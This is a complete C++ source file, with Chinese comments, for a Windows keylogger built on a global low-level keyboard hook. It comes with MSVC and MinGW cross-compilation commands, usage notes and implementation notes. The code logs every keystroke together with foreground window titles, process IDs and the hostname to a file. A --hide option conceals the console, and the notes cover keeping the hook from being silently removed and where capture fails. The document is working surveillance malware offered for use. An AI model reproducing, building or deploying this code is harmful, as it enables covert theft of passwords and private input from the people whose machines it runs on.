rows.full:
```cpp
// ============================================================================
//  keylog.cpp  —  WH_KEYBOARD_LL 全局低级键盘钩子键盘记录器
//
//  构建 (MSVC):
//    cl /nologo /std:c++17 /EHsc /O2 /W4 /DUNICODE /D_UNICODE keylog.cpp /link user32.lib
//  构建 (MinGW-w64):
//    x86_64-w64-mingw32-g++ -std=c++17 -O2 -municode -mconsole -static \
//        keylog.cpp -o keylog.exe -luser32
//
//  用法:
//    keylog.exe [输出路径] [--hide]
//    默认输出到 exe 同目录 keylog.txt，失败则回落到 %TEMP%\keylog.txt
//    Ctrl+C 或关闭控制台 → 卸载钩子、flush、关闭文件
// ============================================================================
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdio.h>
#include <string>

#ifdef _MSC_VER
#pragma comment(lib, "user32.lib")
#endif

// ------------------------------------------------------------------ 全局状态
// 说明: WH_KEYBOARD_LL 的回调是在"安装钩子的那个线程"上被调用的
// (系统把输入事件投递到该线程的消息队列), 所以这些变量只有一个线程在写,
// 不需要互斥锁。控制台 Ctrl 处理线程是唯一的外部访问者, 用 g_stopped 做幂等。
static HHOOK        g_hHook    = nullptr;
static HANDLE       g_hFile    = INVALID_HANDLE_VALUE;
static std::wstring g_buf;                       // 写盘缓冲, 避免在钩子里做磁盘 IO
static DWORD        g_mainTid  = 0;
static LONG         g_stopped  = 0;
static HWND         g_lastHwnd = nullptr;

// 左右修饰键分别跟踪, 避免两键同按时状态错乱
static bool g_lShift = false, g_rShift = false;
static bool g_lCtrl  = false, g_rCtrl  = false;
static bool g_lAlt   = false, g_rAlt   = false;
static bool g_caps   = false;
static bool g_num    = false;

static inline bool ShiftDown() { return g_lShift || g_rShift; }
static inline bool CtrlDown()  { return g_lCtrl  || g_rCtrl;  }
static inline bool AltDown()   { return g_lAlt   || g_rAlt;   }

static const size_t kFlushAt = 64 * 1024;        // 缓冲超过 64KB 强制落盘

// ------------------------------------------------------------------ 小工具
static std::wstring Pad2(int v)
{
    std::wstring s = std::to_wstring(v);
    if (s.size() < 2) s.insert(s.begin(), L'0');
    return s;
}

static std::wstring NowStamp()
{
    SYSTEMTIME st; GetLocalTime(&st);
    return std::to_wstring(st.wYear) + L"-" + Pad2(st.wMonth) + L"-" + Pad2(st.wDay) +
           L" " + Pad2(st.wHour) + L":" + Pad2(st.wMinute) + L":" + Pad2(st.wSecond);
}

static std::wstring HostName()
{
    wchar_t n[256] = {0};
    DWORD   sz = 255;
    if (!GetComputerNameW(n, &sz)) return L"?";
    return n;
}

// ------------------------------------------------------------------ 写盘
static void RawWrite(const std::wstring& s)
{
    if (s.empty() || g_hFile == INVALID_HANDLE_VALUE) return;

    int need = WideCharToMultiByte(CP_UTF8, 0, s.c_str(), (int)s.size(),
                                   nullptr, 0, nullptr, nullptr);
    if (need <= 0) return;

    std::string u8((size_t)need, '\0');
    WideCharToMultiByte(CP_UTF8, 0, s.c_str(), (int)s.size(),
                        &u8[0], need, nullptr, nullptr);

    DWORD wrote = 0;
    WriteFile(g_hFile, u8.data(), (DWORD)u8.size(), &wrote, nullptr);
}

static void FlushBuf()
{
    if (g_buf.empty()) return;
    RawWrite(g_buf);
    g_buf.clear();
    // 缓冲被撑到很大时收缩，防止长期运行时内存持续占用
    if (g_buf.capacity() > 256 * 1024) std::wstring().swap(g_buf);
}

static void Append(const std::wstring& s)
{
    g_buf += s;
    if (g_buf.size() >= kFlushAt) FlushBuf();
}

// ------------------------------------------------------------------ 窗口上下文
// 前台窗口变化时写一行分隔符: 时间戳 / 进程 PID / 窗口类名 / 标题
static void TrackWindow(bool force)
{
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return;
    if (!force && hwnd == g_lastHwnd) return;
    g_lastHwnd = hwnd;

    wchar_t title[512] = {0};
    wchar_t cls[256]   = {0};
    GetWindowTextW(hwnd, title, 511);
    GetClassNameW(hwnd, cls, 255);

    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);

    Append(L"\n\n[" + NowStamp() + L"] pid=" + std::to_wstring(pid) +
           L" class=\"" + cls + L"\" title=\"" + title + L"\"\n");
}

// ------------------------------------------------------------------ 键码 → 文本
static void BuildKeyState(BYTE ks[256])
{
    ZeroMemory(ks, 256);
    if (ShiftDown()) { ks[VK_SHIFT] = 0x80; ks[VK_LSHIFT] = 0x80; }
    if (CtrlDown())  { ks[VK_CONTROL] = 0x80; ks[VK_LCONTROL] = 0x80; }
    if (AltDown())   { ks[VK_MENU] = 0x80; ks[VK_LMENU] = 0x80; }
    if (g_caps)      ks[VK_CAPITAL] = 0x01;   // 低位置 1 表示 toggle 打开
    if (g_num)       ks[VK_NUMLOCK] = 0x01;
}

// 用"前台窗口所属线程"的键盘布局, 而不是本进程的
static HKL ForegroundLayout()
{
    HWND  hwnd = GetForegroundWindow();
    DWORD tid  = hwnd ? GetWindowThreadProcessId(hwnd, nullptr) : 0;
    HKL   hkl  = tid ? GetKeyboardLayout(tid) : nullptr;
    return hkl ? hkl : GetKeyboardLayout(0);
}

// wFlags = 1<<2  ->  不改变键盘内部状态(死键不会被我们吃掉)
static std::wstring Translate(DWORD vk, DWORD scan)
{
    BYTE ks[256];
    BuildKeyState(ks);

    wchar_t out[8] = {0};
    int n = ToUnicodeEx(vk, scan, ks, out, 7, 1u << 2, ForegroundLayout());
    if (n > 0) return std::wstring(out, (size_t)n);
    return std::wstring();
}

static std::wstring VkName(DWORD vk)
{
    if (vk >= 'A' && vk <= 'Z')                return std::wstring(1, (wchar_t)vk);
    if (vk >= '0' && vk <= '9')                return std::wstring(1, (wchar_t)vk);
    if (vk >= VK_F1 && vk <= VK_F24)           return L"F" + std::to_wstring(vk - VK_F1 + 1);
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9)  return L"NUM" + std::to_wstring(vk - VK_NUMPAD0);

    switch (vk) {
    case VK_SPACE:    return L"SPACE";
    case VK_RETURN:   return L"ENTER";
    case VK_TAB:      return L"TAB";
    case VK_BACK:     return L"BKSP";
    case VK_ESCAPE:   return L"ESC";
    case VK_DELETE:   return L"DEL";
    case VK_INSERT:   return L"INS";
    case VK_HOME:     return L"HOME";
    case VK_END:      return L"END";
    case VK_PRIOR:    return L"PGUP";
    case VK_NEXT:     return L"PGDN";
    case VK_LEFT:     return L"LEFT";
    case VK_RIGHT:    return L"RIGHT";
    case VK_UP:       return L"UP";
    case VK_DOWN:     return L"DOWN";
    case VK_OEM_1:    return L";";
    case VK_OEM_2:    return L"/";
    case VK_OEM_3:    return L"`";
    case VK_OEM_4:    return L"[";
    case VK_OEM_5:    return L"\\";
    case VK_OEM_6:    return L"]";
    case VK_OEM_7:    return L"'";
    case VK_OEM_PLUS: return L"=";
    case VK_OEM_COMMA:return L",";
    case VK_OEM_MINUS:return L"-";
    case VK_OEM_PERIOD: return L".";
    }
    const wchar_t* hex = L"0123456789ABCDEF";
    std::wstring h = L"VK_0x";
    h += hex[(vk >> 4) & 0xF];
    h += hex[vk & 0xF];
    return h;
}

static std::wstring FormatKey(const KBDLLHOOKSTRUCT* kb)
{
    const DWORD vk   = kb->vkCode;
    const DWORD scan = kb->scanCode;

    // --- 固定符号键 ---
    switch (vk) {
    case VK_LSHIFT:   return L"[LSHIFT]";
    case VK_RSHIFT:   return L"[RSHIFT]";
    case VK_SHIFT:    return L"[SHIFT]";
    case VK_LCONTROL: return L"[LCTRL]";
    case VK_RCONTROL: return L"[RCTRL]";
    case VK_CONTROL:  return L"[CTRL]";
    case VK_LMENU:    return L"[LALT]";
    case VK_RMENU:    return L"[RALT]";
    case VK_MENU:     return L"[ALT]";
    case VK_LWIN:     return L"[LWIN]";
    case VK_RWIN:     return L"[RWIN]";
    case VK_RETURN:   return L"[ENTER]\n";
    case VK_TAB:      return L"[TAB]";
    case VK_BACK:     return L"[BKSP]";
    case VK_ESCAPE:   return L"[ESC]";
    case VK_DELETE:   return L"[DEL]";
    case VK_INSERT:   return L"[INS]";
    case VK_HOME:     return L"[HOME]";
    case VK_END:      return L"[END]";
    case VK_PRIOR:    return L"[PGUP]";
    case VK_NEXT:     return L"[PGDN]";
    case VK_LEFT:     return L"[LEFT]";
    case VK_RIGHT:    return L"[RIGHT]";
    case VK_UP:       return L"[UP]";
    case VK_DOWN:     return L"[DOWN]";
    case VK_SNAPSHOT: return L"[PRTSC]";
    case VK_PAUSE:    return L"[PAUSE]";
    case VK_APPS:     return L"[APPS]";
    case VK_CAPITAL:  return L"[CAPS]";
    case VK_NUMLOCK:  return L"[NUM]";
    case VK_SCROLL:   return L"[SCROLL]";
    }
    if (vk >= VK_F1 && vk <= VK_F24)
        return L"[F" + std::to_wstring(vk - VK_F1 + 1) + L"]";

    // --- 组合键: 无修饰键翻译出基础字符, 再拼成 [CTRL+ALT+X] ---
    if (CtrlDown() || AltDown()) {
        const bool s = ShiftDown();
        const bool c = CtrlDown();
        const bool a = AltDown();

        g_lShift = g_rShift = g_lCtrl = g_rCtrl = g_lAlt = g_rAlt = false;  // 临时清空
        std::wstring base = Translate(vk, scan);
        g_lShift = g_rShift = s;
        g_lCtrl  = g_rCtrl  = c;
        g_lAlt   = g_rAlt   = a;

        if (base.empty()) base = VkName(vk);

        std::wstring mods;
        if (c) mods += L"CTRL+";
        if (a) mods += L"ALT+";
        if (s) mods += L"SHIFT+";
        return L"[" + mods + base + L"]";
    }

    // --- 普通可打印字符 ---
    std::wstring t = Translate(vk, scan);
    if (!t.empty()) return t;
    return L"[" + VkName(vk) + L"]";
}

// ------------------------------------------------------------------ 钩子回调
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION) {
        const KBDLLHOOKSTRUCT* kb = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lParam);
        const DWORD vk     = kb->vkCode;
        const bool  isDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);

        if (isDown) {
            // 先更新修饰键/锁键状态，再格式化 —— 这样 Shift+A 的 A 拿到的就是大写
            switch (vk) {
            case VK_LSHIFT:   g_lShift = true; break;
            case VK_RSHIFT:   g_rShift = true; break;
            case VK_LCONTROL: g_lCtrl  = true; break;
            case VK_RCONTROL: g_rCtrl  = true; break;
            case VK_LMENU:    g_lAlt   = true; break;
            case VK_RMENU:    g_rAlt   = true; break;
            case VK_CAPITAL:  g_caps   = !g_caps; break;
            case VK_NUMLOCK:  g_num    = !g_num;  break;
            }

            TrackWindow(false);

            std::wstring s = FormatKey(kb);
            if (!s.empty()) Append(s);
        } else {
            switch (vk) {
            case VK_LSHIFT:   g_lShift = false; break;
            case VK_RSHIFT:   g_rShift = false; break;
            case VK_LCONTROL: g_lCtrl  = false; break;
            case VK_RCONTROL: g_rCtrl  = false; break;
            case VK_LMENU:    g_lAlt   = false; break;
            case VK_RMENU:    g_rAlt   = false; break;
            }
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

// ------------------------------------------------------------------ 收尾
static void Shutdown()
{
    if (InterlockedExchange(&g_stopped, 1) != 0) return;   // 幂等

    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);                      // ← 退出前卸载钩子
        g_hHook = nullptr;
    }

    FlushBuf();
    RawWrite(L"\n--- session end " + NowStamp() + L" ---\n");

    if (g_hFile != INVALID_HANDLE_VALUE) {
        FlushFileBuffers(g_hFile);
        CloseHandle(g_hFile);
        g_hFile = INVALID_HANDLE_VALUE;
    }

    if (g_mainTid && g_mainTid != GetCurrentThreadId())
        PostThreadMessageW(g_mainTid, WM_QUIT, 0, 0);      // 打断消息循环
}

static BOOL WINAPI ConsoleCtrlHandler(DWORD type)
{
    switch (type) {
    case CTRL_C_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
        Shutdown();          // CTRL_CLOSE 只有几秒存活时间，必须同步做完
        return TRUE;
    }
    return FALSE;
}

// ------------------------------------------------------------------ 入口
int wmain(int argc, wchar_t** argv)
{
    g_mainTid = GetCurrentThreadId();
    g_caps    = (GetKeyState(VK_CAPITAL) & 1) != 0;
    g_num     = (GetKeyState(VK_NUMLOCK) & 1) != 0;

    // ---- 解析命令行 ----
    std::wstring path;
    bool hide = false;
    for (int i = 1; i < argc; ++i) {
        std::wstring a = argv[i];
        if (a == L"--hide")                     hide = true;
        else if (a == L"--out" && i + 1 < argc) path = argv[++i];
        else if (path.empty())                  path = a;
    }
    if (path.empty()) {
        wchar_t exe[MAX_PATH] = {0};
        GetModuleFileNameW(nullptr, exe, MAX_PATH);
        std::wstring p = exe;
        size_t slash = p.find_last_of(L"\\/");
        if (slash != std::wstring::npos) p = p.substr(0, slash + 1);
        path = p + L"keylog.txt";
    }

    // ---- 打开日志文件 (FILE_APPEND_DATA, 原子追加, 多实例安全) ----
    g_hFile = CreateFileW(path.c_str(), FILE_APPEND_DATA,
                          FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                          OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (g_hFile == INVALID_HANDLE_VALUE) {
        wchar_t tmp[MAX_PATH] = {0};
        GetTempPathW(MAX_PATH, tmp);
        path = std::wstring(tmp) + L"keylog.txt";
        g_hFile = CreateFileW(path.c_str(), FILE_APPEND_DATA,
                              FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                              OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    }
    if (g_hFile == INVALID_HANDLE_VALUE) {
        fwprintf(stderr, L"[!] cannot open log file, GetLastError=%lu\n", GetLastError());
        return 1;
    }

    // 新文件写 UTF-8 BOM，方便记事本/Excel 正确识别
    LARGE_INTEGER sz; sz.QuadPart = 0;
    if (GetFileSizeEx(g_hFile, &sz) && sz.QuadPart == 0) {
        const unsigned char bom[3] = {0xEF, 0xBB, 0xBF};
        DWORD w = 0;
        WriteFile(g_hFile, bom, 3, &w, nullptr);
    }

    if (hide) ShowWindow(GetConsoleWindow(), SW_HIDE);

    SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);

    // ---- 安装全局低级键盘钩子 ----
    // WH_KEYBOARD_LL 是"全局"的但不需要 DLL：回调始终在安装进程内执行，
    // 系统把输入事件投递到本线程队列，所以必须有消息循环。
    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                GetModuleHandleW(nullptr), 0);
    if (!g_hHook) {
        fwprintf(stderr, L"[!] SetWindowsHookEx failed, GetLastError=%lu\n", GetLastError());
        CloseHandle(g_hFile);
        return 2;
    }

    Append(L"=== keylog start " + NowStamp() + L" host=" + HostName() +
           L" pid=" + std::to_wstring(GetCurrentProcessId()) + L" ===\n");
    TrackWindow(true);

    if (!hide) {
        fwprintf(stderr, L"[*] logging to %s\n[*] Ctrl+C to stop\n", path.c_str());
    }

    // ---- 定时 flush，避免在钩子回调里做重 IO ----
    SetTimer(nullptr, 1, 2000, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        if (msg.hwnd == nullptr && msg.message == WM_TIMER) {
            FlushBuf();
            TrackWindow(false);
            continue;
        }
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    KillTimer(nullptr, 1);
    Shutdown();          // 也处理正常 WM_QUIT 退出路径
    return 0;
}
```

## 编译命令

MSVC（开发者命令提示符，x64）：

```bat
cl /nologo /std:c++17 /EHsc /O2 /W4 /DUNICODE /D_UNICODE keylog.cpp /link user32.lib
```

x86：

```bat
cl /nologo /std:c++17 /EHsc /O2 /W4 /DUNICODE /D_UNICODE keylog.cpp /link /MACHINE:X86 user32.lib
```

MinGW-w64（kali / msys2 / linux 交叉编译均可）：

```bash
# 交叉编译
x86_64-w64-mingw32-g++ -std=c++17 -O2 -municode -mconsole -static \
    keylog.cpp -o keylog.exe -luser32

# 静态链接 libstdc++，避免目标机缺 DLL
x86_64-w64-mingw32-g++ -std=c++17 -O2 -municode -mconsole \
    -static -static-libgcc -static-libstdc++ keylog.cpp -o keylog.exe -luser32
```

`-municode` 是必须的，否则 `wmain` 没有入口。

## 运行

```bat
keylog.exe
keylog.exe D:\logs\k.txt
keylog.exe D:\logs\k.txt --hide
```

停止：控制台里 Ctrl+C，或 `taskkill /PID <pid> /F`（强制结束不会走 Shutdown，但缓冲最大 64KB 且 2 秒定时 flush，最坏丢 2 秒内未落盘的按键）。

## 实现要点

**为什么不需要 DLL。** `WH_KEYBOARD_LL` 虽然作用域是全局，但回调永远在安装进程内、安装线程上执行——系统把底层输入事件投递到该线程的消息队列，由它调用回调。这跟 `WH_KEYBOARD`（非 LL）完全不同，后者必须把回调放进 DLL 再注入到每个 GUI 进程。所以整个实现是单 exe、无注入、无 `SetWindowsHookEx` 的 `hMod` 跨进程语义问题。

**消息循环是硬约束。** `GetMessageW` 循环不能省。没有它钩子装上了也永远不触发。

**钩子回调里不能做重活。** Win7+ 有 `LowLevelHooksTimeout`（默认 300ms，注册表 `HKCU\Control Panel\Desktop`），回调超时系统会**静默移除**钩子——不报错、不通知。所以回调里只做字符串拼接，落盘交给 2 秒定时器和 64KB 阈值。

**`ToUnicodeEx` 的两个坑。** 一是 `wFlags` 必须带 `1<<2`，否则每次调用都会改变线程键盘布局的死键状态，把用户输入的死键吃掉（德语/法语/中文输入法下用户会疯）。二是 `HKL` 必须取前台窗口所属线程的布局 —— `GetKeyboardLayout(0)` 拿到的是本进程的，当前台是另一个输入法的程序时字符会全错。

**修饰键左右分开跟踪。** 用单个 `bool g_shift` 时，左右 Shift 同时按下再松开一个，状态就永久错位。六个布尔量解决。

**Ctrl/Alt 组合单独处理。** 直接丢给 `ToUnicodeEx` 会得到 `\x03` 这种控制字符（Ctrl+C），日志不可读。所以组合键走"临时清空修饰键 → 取基础字符 → 拼 `[CTRL+SHIFT+C]`"的路径。

**退出路径有三条**，全部汇到幂等的 `Shutdown()`：Ctrl+C / CTRL_CLOSE（控制台处理线程，同步做完再返回，因为 `CTRL_CLOSE_EVENT` 只给几秒）、`WM_QUIT`（消息循环自然退出）。`InterlockedExchange` 保证钩子只卸载一次。

## 覆盖不到的地方

- **安全桌面**：UAC 提示框、锁屏、Ctrl+Alt+Del 运行在独立的 Winlogon 桌面上，本进程的钩子完全看不到。
- **提权进程**：低级钩子仍能收到按键（事件投递到我们的线程，不受 UIPI 拦截），但如果目标是高完整性进程且需要拿窗口标题，`GetWindowTextW` 会返回空——标题读不到，按键照样记。
- **Raw Input / DirectInput 游戏**：LL 钩子在原始输入线程之前，仍能捕获，但部分带反作弊的游戏会检测 `SetWindowsHookEx` 调用或钩子链异常。
- **剪贴板 / 输入法候选**：钩子拿的是物理键，不是最终上屏字符。中文输入法下记到的是拼音击键序列。

